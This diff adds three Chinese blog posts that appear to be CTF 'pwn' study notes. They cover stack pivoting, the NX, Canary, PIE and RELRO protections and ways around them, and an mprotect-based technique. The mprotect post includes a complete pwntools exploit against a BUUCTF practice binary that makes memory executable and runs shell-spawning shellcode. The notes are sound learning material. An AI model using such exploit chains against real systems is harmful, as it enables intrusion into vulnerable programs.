@@ -42,6 +42,210 @@
       <div id="content" class="outer">
         <section id="main">
   
+    <article id="post-简记录栈迁移学习途中复习汇编的流程" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="2023/04/08/%E7%AE%80%E8%AE%B0%E5%BD%95%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AD%A6%E4%B9%A0%E9%80%94%E4%B8%AD%E5%A4%8D%E4%B9%A0%E6%B1%87%E7%BC%96%E7%9A%84%E6%B5%81%E7%A8%8B/" class="article-date">
+  <time class="dt-published" datetime="2023-04-07T22:19:44.000Z" itemprop="datePublished">2023-04-08</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="categories/CG/">CG</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="2023/04/08/%E7%AE%80%E8%AE%B0%E5%BD%95%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AD%A6%E4%B9%A0%E9%80%94%E4%B8%AD%E5%A4%8D%E4%B9%A0%E6%B1%87%E7%BC%96%E7%9A%84%E6%B5%81%E7%A8%8B/">简记录栈迁移学习途中复习汇编的流程</a>
+    </h1>
+  
+
+      </header>
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>#一些汇编指令的含义<br>![[Pasted image 20230312120910.png]]<br>1<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>pop出栈<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>即将栈顶指针所指向的数据弹出栈并储存在指定的寄存器中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>并将栈顶指针向高地址移动一段距离<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><br>以下为具体示意<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><code>pop</code>是汇编指令中的一种<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>用于从栈中弹出数据并存储到指定的内存地址中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>它的含义是将栈顶指针所指向的数据弹出栈并存储到指定的内存地址中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>并将栈顶指针向上移动一段距离<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>以便后续可以继续从栈中弹出数据<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>在Intel 80x86 CPU架构中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><code>pop</code>指令通常用于函数调用时弹出参数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>以及恢复程序现场时恢复寄存器的值等场景<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><code>pop</code>指令的操作数可以是寄存器或内存地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>具体取决于所要弹出栈中的数据类型和数据存储的位置<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>当数据类型为字节时<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>栈顶指针向上移动一个字节的距离<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span>当数据类型为双字<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>DWORD<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>时<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>栈顶指针向上移动4个字节的距离<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>在执行<code>pop</code>指令时<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>需要确保栈顶指针不会越过栈顶<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>否则就会发生栈下溢等错误<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></p>
+<p>2<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>push入栈<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>即将数据放入栈顶指针所指向的位置<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>并将栈顶指针向下以移动一段距离<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><code>是不是很形象的将栈帧向下移动一段距离</code><br>以下为具体示意<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><code>push</code>是汇编指令中的一种<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>用于将数据压入栈中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>它的含义是将数据放入栈顶指针所指向的位置<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>并将栈顶指针向下移动一段距离<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>以便后续可以继续向栈中压入数据<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>在Intel 80x86 CPU架构中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><code>push</code>指令通常用于函数调用时将参数入栈<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>以及保存当前程序现场时保存寄存器的值等场景<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><code>push</code>指令的操作数可以是寄存器<span class="bd-box"><h-char class="bd bd-beg"><h-inner>、</h-inner></h-char></span>内存地址或立即数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>具体取决于所要压入栈中的数据类型和数据存储的位置<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>当数据类型为字节时<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>栈顶指针向下移动一个字节的距离<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span>当数据类型为双字<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>DWORD<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>时<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>栈顶指针向下移动4个字节的距离<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>在执行<code>push</code>指令时<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>需要确保栈顶指针不会越过栈底<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>否则就会发生栈溢出等错误<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></p>
+<p>3<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>mov  ebp <span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>esp即为<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>ebp&lt;—–esp将右值赋给左值<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>更可以形象理解为<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>左边的寄存器移动到右边<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></p>
+<p>4,b高s低<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>b底s顶<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>b静s动<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>b过去s未来<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>s就是光标<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><br>b是赛高的s无所谓<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><br>esp ebp在函数调用过程中的形式<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></p>
+<pre><code>高地址
+......
+|        |
+|        |&lt;- EBP&lt;span class=&quot;bd-box&quot;&gt;&lt;h-char class=&quot;bd bd-end&quot;&gt;&lt;h-inner&gt;（&lt;/h-inner&gt;&lt;/h-char&gt;&lt;/span&gt;栈底&lt;span class=&quot;bd-box&quot;&gt;&lt;h-char class=&quot;bd bd-beg&quot;&gt;&lt;h-inner&gt;）&lt;/h-inner&gt;&lt;/h-char&gt;&lt;/span&gt;
+|  局部  |
+|  变量  |
+|        |
+|        |
+|  参数  |
+|        |
+|        |
+|        |&lt;- ESP&lt;span class=&quot;bd-box&quot;&gt;&lt;h-char class=&quot;bd bd-end&quot;&gt;&lt;h-inner&gt;（&lt;/h-inner&gt;&lt;/h-char&gt;&lt;/span&gt;栈顶&lt;span class=&quot;bd-box&quot;&gt;&lt;h-char class=&quot;bd bd-beg&quot;&gt;&lt;h-inner&gt;）&lt;/h-inner&gt;&lt;/h-char&gt;&lt;/span&gt;
+......
+低地址  
+</code></pre>
+<p>5<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>栈和寄存器的相互作用关系<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>弹出old ebp<code>地址</code>给ebp<code>寄存器</code>之后ebp<code>寄存器</code>在栈旁侧进行指向<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></p>
+<p>6<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>leave为先动<em>sp寄存器指针<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>再动bp寄存器</em><span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>而栈迁移的攻击核心就在于<em>利用两次的leave指令使得sp指针被篡改到目标地址</em><span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>篡改ep地址为目标地址见-4<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span><br>———————————————————————————分割线<br>#以下为栈迁移的讲解<br><code>核心思想&lt;span class=&quot;bd-box&quot;&gt;&lt;h-char class=&quot;bd bd-beg&quot;&gt;&lt;h-inner&gt;：&lt;/h-inner&gt;&lt;/h-char&gt;&lt;/span&gt;</code>让esp跑两次<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><br>第一次<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>使<code>篡改</code>过后的old ebp地址出栈<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>进入ebp中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><br>第二次<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>使esp跟随到篡改过后的old ebp当中开辟出一段新的栈空间<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></p>
+<p>![[Pasted image 20230303190918.png]]<br>![[Pasted image 20230303190931.png]]<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)</a><br>这篇文章讲解的足够详细<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>看这篇文章就足矣<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><br>要点归纳<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br>1<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><strong>ebp</strong> 覆盖为 HijackAddr-4的目的是<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>当第二次执行完leave的pop ebp后esp回向高地址移动四个字节<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>从而使得esp指向 HijackAddr的地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>从而使得<strong>eip</strong>中成功放入目标地址完成程序流窜改<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-总结一：pwn题中的四大保护：" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="2023/04/08/%E6%80%BB%E7%BB%93%E4%B8%80%EF%BC%9Apwn%E9%A2%98%E4%B8%AD%E7%9A%84%E5%9B%9B%E5%A4%A7%E4%BF%9D%E6%8A%A4%EF%BC%9A/" class="article-date">
+  <time class="dt-published" datetime="2023-04-07T22:18:50.000Z" itemprop="datePublished">2023-04-08</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="categories/CG/">CG</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="2023/04/08/%E6%80%BB%E7%BB%93%E4%B8%80%EF%BC%9Apwn%E9%A2%98%E4%B8%AD%E7%9A%84%E5%9B%9B%E5%A4%A7%E4%BF%9D%E6%8A%A4%EF%BC%9A/">总结一：pwn题中的四大保护：</a>
+    </h1>
+  
+
+      </header>
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="NX防护："><a href="#NX防护：" class="headerlink" title="NX防护："></a>NX防护<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h2><p>![[Pasted image 20221023181159.png]]</p>
+<ul>
+<li>意义<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>No-eXecute<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>不可执行<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span></li>
+<li>基本原理<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>是将数据所在内存页标识为不可执行<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>当程序溢出成功转入Shellcode时<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>程序会尝试在数据页面上执行指令<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>此时CPU就会抛出异常<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>而不是去执行恶意指令<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>got ELF while …….<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>{思考如果存在mprotect可以进行NX防护的绕过}</li>
+<li>用来防护的攻击手段<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>栈溢出 + 跳到栈上执行shellcode</li>
+<li>添加编译选项-z execstack 会关闭NX保护</li>
+<li>绕过方式<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>ROP<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>在代码段中寻在合适gadget<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>构造gadget链<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>最终实现获取shell</li>
+</ul>
+<h2 id="CANARY保护："><a href="#CANARY保护：" class="headerlink" title="CANARY保护："></a>CANARY保护<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h2><p>![[Pasted image 20221023181117.png]]</p>
+<ul>
+<li>栈溢出保护<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>阻止所有单纯的栈溢出<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span></li>
+<li>基本原理<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>是一种针对缓冲区溢出攻击的缓解手段<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>当函数存在缓冲区溢出攻击漏洞时<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>攻击者可以覆盖栈上的返回地址来让Shellcode能够得到执行<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>当启用栈保护后<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>函数开始执行的时候<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>会先往栈里插入Cookie信息<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>当函数真正返回的时候会验证Cookie信息是否合法<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>如果不合法就停止程序运行<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>攻击者在覆盖返回地址的是否往往也会将Cookie信息给覆盖掉<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>导致栈保护检查失败而阻止Shellcode的执行<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>在Linux中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>将Cookie信息称为Canary  </li>
+<li>通俗解释<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>在栈中紧挨ebp的上一个位置存放一个随机数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span>当发生栈溢出时程序检查CANARY这个值和之前的是否一致<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>如果不一致<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则  不会往下运行<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>从而避免了缓冲区溢出攻击<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+<li><ul>
+<li>添加编译选项 -fno-stack-protector 会关闭程序的stack canary栈保护</li>
+</ul>
+</li>
+<li>绕过方式<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br>1<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span> 获取填充的随机数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>通过爆破<span class="bd-box"><h-char class="bd bd-beg"><h-inner>、</h-inner></h-char></span>泄露等方法获取随机数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>制造栈溢出的时候在原有位置写入随机数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>从而实现Canary的绕过<br>2<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>劫持<code>sym.imp.__stack_chk_fail</code>函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>若果可以劫持<code>sym.imp.__stack_chk_fail</code>函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>使得程序调用它时调用别的函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>就可以随意覆写Canary的值<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>而不会触发错误<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>实现Canary的绕过<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><br> 具体绕过及例题演示参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/Morphy_Amo/article/details/122120696">Canary原理及绕过</a></li>
+</ul>
+<h2 id="PIE-x2F-ALSR保护："><a href="#PIE-x2F-ALSR保护：" class="headerlink" title="PIE&#x2F;ALSR保护："></a>PIE&#x2F;ALSR保护<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h2><ul>
+<li>Position-Independent Executable</li>
+<li>基本原理<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span> 应用了PIE的程序在每次加载时都会变换加载基址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>从而使位于程序本身的gadget也失效</li>
+<li>通俗解释<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>而如果没有开PIE的话那么No PIE(0x400000)<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>括号内的数据就是程序的基地址.</li>
+<li>防止攻击手段<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>构造ROP链攻击如<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>ret2libc</li>
+<li>添加编译选项 -no-pie 会关闭程序的PIE保护</li>
+<li>绕过方式<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>通过泄露libc基址的方法获取libc版本加便宜量来获取基地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+</ul>
+<h2 id="RELRO保护："><a href="#RELRO保护：" class="headerlink" title="RELRO保护："></a>RELRO保护<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h2><ul>
+<li><p>基本原理<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span> 重定位<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>从而减少对GOT<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>Global Offset Table<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>攻击</p>
+</li>
+<li><p>防止攻击者的攻击手段<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>系统调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>防止got表的调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span></p>
+</li>
+<li><p>三种保护模式<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br>  1<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>No RELRO<br>  2<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>Partial RELRO<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>两者区别在于got.plt位于那一段是可读可写的<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span></p>
+<p>  3<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>Full RELRO<br>  .got 与.got.plt都只读不写<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>对got表的一种防护手段<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span></p>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-mprotect（）函数" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="2023/04/08/mprotect%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0/" class="article-date">
+  <time class="dt-published" datetime="2023-04-07T22:17:21.000Z" itemprop="datePublished">2023-04-08</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="categories/CG/">CG</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="2023/04/08/mprotect%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0/">mprotect（）函数</a>
+    </h1>
+  
+
+      </header>
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/elg5127/article/details/124221422">https://blog.csdn.net/elg5127/article/details/124221422</a><br>这个是csdn上的讲解</p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/bp97ri">BUU-PWN题<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>1-40<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span> (yuque.com)</a><br>这个是语雀上的讲解</p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/igq0ed">PWN疑难<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>1-3<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>-关于payload中栈的布置以及system的一些困惑 (yuque.com)</a><br>对于栈传参一篇写的贼好的文章<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span></p>
+<p>疑问点解释<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br>1<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>mprootect()函数修改的是那段内存空间<span class="bd-box"><h-char class="bd bd-beg"><h-inner>？</h-inner></h-char></span><br>首先<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>mprotect<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>函数将一段具有可读写无执行权限的内存空间更改权限可执行<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><br>![[Pasted image 20221108161747.png]]<br>之后直接把恶意数据直接篡改到这里面即可<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><br>调用数据的话直接调用这里的地址即可<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></p>
+<p>2<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>pop3函数参数在栈上是如何实现的<span class="bd-box"><h-char class="bd bd-beg"><h-inner>？</h-inner></h-char></span><br>首先给到exp看下内容<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br>from pwn import *<br>elf &#x3D; ELF(‘.&#x2F;pwn’)<br>sh &#x3D; process(‘.&#x2F;pwn’)<br>&#x3D; remote(‘node3.buuoj.cn’,27234)<br>pop3_ret &#x3D; 0x0809e4c5<br>mem_addr &#x3D; 0x080ea000<br>#可读可写的内存,但不可执行<br>mem_size &#x3D; 0x3000<br>#通过调试出来的值<br>mem_proc &#x3D; 0x7<br>#可代表可读可写可执行<br>mprotect_addr &#x3D; elf.symbols[‘mprotect’]<br>read_addr &#x3D; elf.symbols[‘read’]<br>payload_01 &#x3D; ‘A’ * 0x38<br>payload_01 +&#x3D; p32(mprotect_addr)<br>payload_01 +&#x3D; p32(pop3_ret)                   <strong>这里的寄存器并非是用来传递参数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>而是作为返回地址来使得esp向下走12<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>正好可以执行read函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></strong><br>#执行完mprotect的返回地址,使esp往下+12<br>payload_01 +&#x3D; p32(mem_addr)<br>#mprotect函数参数1 修改的内存地址<br>payload_01 +&#x3D; p32(mem_size)<br>#mprotect函数参数2 修改的内存大小<br>payload_01 +&#x3D; p32(mem_proc) </p>
+<p>#mprotect函数参数3 修改的权限<br>payload_01 +&#x3D; p32(read_addr)<br>#执行完上面pop3_ret后到read函数<br>payload_01 +&#x3D; p32(pop3_ret)<br>#执行完read后将返回到pop3_ret指令      <strong>又继续使esp+12到mem_addr</strong><br>payload_01 +&#x3D; p32(0)<br>#read函数参数1 从输入端读取<br>payload_01 +&#x3D; p32(mem_addr)<br>#读取到的内容复制到指向的内存里<br>payload_01 +&#x3D; p32(0x100)<br>#读取已知内存的地址内容大小<br>payload_01 +&#x3D; p32(mem_addr)</p>
+<p>#这里就是shellcode了<br>sh.sendline(payload_01)<br>payload_sh &#x3D; asm(shellcraft.sh(),arch &#x3D; ‘i386’, os &#x3D; ‘linux’)<br>sh.sendline(payload_sh)<br>#这就是read读入的内容<br>sh.interactive()</p>
